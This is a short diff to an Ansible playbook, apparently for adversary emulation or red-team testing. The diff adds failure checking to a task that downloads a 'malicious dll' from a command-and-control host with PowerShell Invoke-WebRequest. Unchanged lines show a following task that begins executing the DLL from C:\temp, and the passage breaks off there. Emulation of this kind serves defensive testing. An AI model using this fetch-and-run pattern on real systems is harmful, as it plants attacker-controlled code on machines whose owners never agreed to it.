@@ -6,6 +6,8 @@
   tasks:
     - name: download malicious dll
       win_shell: Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }}
+      register: command_result
+      failed_when: "'FAILED' in command_result.stderr"   
     - name: execute malicious dll
       win_shell: |
         cd c:\temp
